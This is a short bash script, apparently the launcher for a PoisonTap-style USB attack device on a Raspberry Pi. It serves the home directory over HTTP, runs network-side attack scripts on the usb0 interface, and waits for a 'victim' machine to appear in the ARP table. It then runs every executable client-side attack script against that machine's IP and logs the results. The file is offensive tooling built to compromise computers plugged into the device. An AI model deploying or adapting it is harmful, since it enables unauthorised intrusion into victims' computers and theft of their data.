#!/bin/bash

HOME='/home/pi'
time=$(date +'%H:%M:%S_%d.%m.%Y')

screen -dms Xorg xinit -- /usr/bin/X :0 # (optional) for GUI scripts
screen -dms www python3 -m http.server --bind 2.0.0.1 --directory $HOME 80

cd $HOME

for script in $(find on_network/ -type f -perm -u+x)
do
	exec $script usb0 poisontap >> $HOME/poisontap_$time.log &
done

while : # waiting victim
do
	echo 1 > /sys/class/leds/led0/brightness
	if [ $(arp -an | sed -rn 's/.*\((\([^)]+\))\).*\[ether\] on usb0/\1/p' | wc -l) -ne 0 ]
	then
		break
	fi
	sleep 0.1
	echo 0 > /sys/class/leds/led0/brightness
	sleep 1
done

led green on

arp -an | sed -rn 's/.*\((\([^)]+\))\).*\[ether\] on usb0/\1/p' | while read ip
do
	for script in $(find on_client/ -type f -perm -u+x)
	do
		exec $script $ip "" 1.0.0.1 >> $HOME/poisontap_$time.log &
	done
done

tail -f $HOME/poisontap_$time.log
